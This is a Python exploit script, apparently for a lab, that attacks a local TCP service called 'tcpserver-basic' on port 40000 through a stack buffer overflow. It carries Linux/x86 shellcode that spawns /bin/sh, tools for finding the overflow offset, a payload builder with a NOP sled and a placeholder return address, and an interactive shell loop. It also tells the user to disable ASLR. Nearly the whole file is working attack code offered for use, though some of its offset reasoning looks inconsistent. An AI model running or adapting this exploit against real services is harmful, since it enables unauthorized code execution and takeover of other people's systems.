#!/usr/bin/env python3

import socket
import struct
import sys
import time

# Default target information
TARGET_HOST = '127.0.0.1'
TARGET_PORT = 40000  # The port where the segmentation fault was observed

# Buffer size in the vulnerable program
BUFFER_SIZE = 128

# Linux/x86 shellcode that executes /bin/sh
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

def pattern_create(length):
    """Create a pattern of a given length"""
    pattern = b""
    parts = []
    for upper in range(65, 91):  # uppercase 'A'-'Z'
        for lower in range(97, 123):  # lowercase 'a'-'z'
            for digit in range(48, 58):  # digits '0'-'9'
                parts.append(bytes([upper, lower, digit]))
                if len(pattern) + 3 <= length:
                    pattern += bytes([upper, lower, digit])
                    if len(pattern) == length:
                        return pattern
    # If we need more pattern than the standard one, cycle through again
    while len(pattern) < length:
        pattern += parts[len(pattern) % len(parts)]
        if len(pattern) == length:
            return pattern
    return pattern

def pattern_offset(value, pattern_length=600):
    """Find the offset of a value in the pattern"""
    pattern = pattern_create(pattern_length)
    if isinstance(value, int):
        # Convert the value to little-endian bytes
        value_bytes = struct.pack("<I", value)
    else:
        value_bytes = value.encode()
    
    try:
        offset = pattern.index(value_bytes)
        return offset
    except ValueError:
        return -1

def create_payload(offset_to_eip):
    # Padding to reach the return address
    padding = b"A" * offset_to_eip
    
    # NOP sled to increase chances of hitting our shellcode
    nop_sled = b"\x90" * 32
    
    # Return address - we'll overwrite EIP with this address
    # This is a placeholder - you need to replace it with the actual address
    # where your shellcode will be located in memory
    # For demonstration, we'll use a fake address
    # In a real exploit, you would determine this address by examining the stack
    return_addr = struct.pack("<I", 0xbffff5c0)  # Example address, needs to be adjusted
    
    # Construct the final payload
    payload = padding + return_addr + nop_sled + shellcode
    
    return payload

def exploit(host, port, payload):
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {host}:{port}")
        s.connect((host, port))
        
        # Send the payload
        print(f"[*] Sending payload ({len(payload)} bytes)")
        s.send(payload)
        
        # Try to receive data (may not happen if exploit works)
        try:
            response = s.recv(1024)
            print(f"[*] Received: {response}")
        except:
            pass
        
        # If exploit is successful, we should get a shell
        print("[*] If the exploit was successful, the server should have crashed or a shell should be available")
        print("[*] Attempting to interact with shell (if available)...")
        
        # Try to interact with the shell
        try:
            while True:
                command = input("shell> ")
                if command.lower() in ['exit', 'quit']:
                    break
                s.send(command.encode() + b'\n')
                time.sleep(0.5)  # Give the server time to respond
                response = s.recv(4096)
                print(response.decode('latin-1'))
        except Exception as e:
            print(f"[!] Shell interaction failed: {e}")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Close the socket
        s.close()

def find_offset():
    # Create a pattern to find the exact offset
    pattern_size = 600  # Larger than the 516 bytes that caused the crash
    pattern = pattern_create(pattern_size)
    
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}")
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # Send the pattern
        print(f"[*] Sending pattern ({len(pattern)} bytes)")
        s.send(pattern)
        
        print("[*] Pattern sent. Check the value of EIP in the crash to determine the offset.")
        print("[*] Run: dmesg | tail   or check core dump to find the EIP value")
        print("[*] Then use: python3 exploit-tcpserver-40000.py offset <EIP_VALUE>")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Close the socket
        s.close()

def send_specific_size(size):
    # Send a payload of specific size to test
    payload = b"A" * size
    
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}")
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # Send the payload
        print(f"[*] Sending {size} bytes")
        s.send(payload)
        
        print(f"[*] Sent {size} bytes. Check if server crashed.")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Close the socket
        s.close()

def analyze_crash():
    # Based on the segmentation fault at 516 bytes, we'll send incremental payloads
    # to narrow down the exact crash point
    start_size = 500
    end_size = 530
    step = 4
    
    print("[*] Starting crash analysis...")
    print(f"[*] Testing payload sizes from {start_size} to {end_size} bytes in steps of {step}")
    
    for size in range(start_size, end_size + 1, step):
        print(f"\n[*] Testing payload size: {size} bytes")
        send_specific_size(size)
        
        # Ask user if the server crashed
        response = input("Did the server crash? (y/n): ").lower()
        if response == 'y':
            print(f"[+] Found crash point at approximately {size} bytes")
            print(f"[*] Now try using the pattern to find the exact offset")
            print(f"[*] Run: python3 exploit-tcpserver-40000.py pattern")
            break
        
        # Wait a moment before the next test
        time.sleep(1)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mode> [args...]")
        print("Modes:")
        print("  pattern - Send a pattern to find the offset")
        print("  offset <value> - Find the offset of a value in the pattern")
        print("  size <bytes> - Send a specific number of bytes")
        print("  analyze - Incrementally test different payload sizes")
        print("  exploit [offset] - Send the exploit payload (default offset: 140)")
        return
    
    mode = sys.argv[1]
    
    if mode == "pattern":
        find_offset()
    elif mode == "offset" and len(sys.argv) > 2:
        try:
            # Try to interpret as hex
            value = int(sys.argv[2], 16)
            offset = pattern_offset(value)
            if offset != -1:
                print(f"[*] Offset found at: {offset}")
            else:
                print(f"[!] Value not found in pattern")
        except ValueError:
            print(f"[!] Invalid value: {sys.argv[2]}")
    elif mode == "size" and len(sys.argv) > 2:
        try:
            size = int(sys.argv[2])
            send_specific_size(size)
        except ValueError:
            print(f"[!] Invalid size: {sys.argv[2]}")
    elif mode == "analyze":
        analyze_crash()
    elif mode == "exploit":
        # Use provided offset or default to an estimate based on the buffer size
        if len(sys.argv) > 2:
            try:
                offset_to_eip = int(sys.argv[2])
            except ValueError:
                print(f"[!] Invalid offset: {sys.argv[2]}")
                return
        else:
            # Based on the segmentation fault at 516 bytes, we estimate the offset
            # This is an estimate and should be verified with pattern analysis
            offset_to_eip = 140  # BUFFER_SIZE + some bytes for stack frame
            print(f"[*] Using default offset: {offset_to_eip}")
            print("[*] For better results, determine the exact offset using pattern analysis")
        
        payload = create_payload(offset_to_eip)
        exploit(TARGET_HOST, TARGET_PORT, payload)
    else:
        print(f"Unknown mode: {mode}")

if __name__ == "__main__":
    print("Buffer Overflow Exploit for tcpserver-basic on port 40000")
    print("-----------------------------------------------------")
    print("[!] Remember to disable ASLR with: echo 0 > /proc/sys/kernel/randomize_va_space")
    main()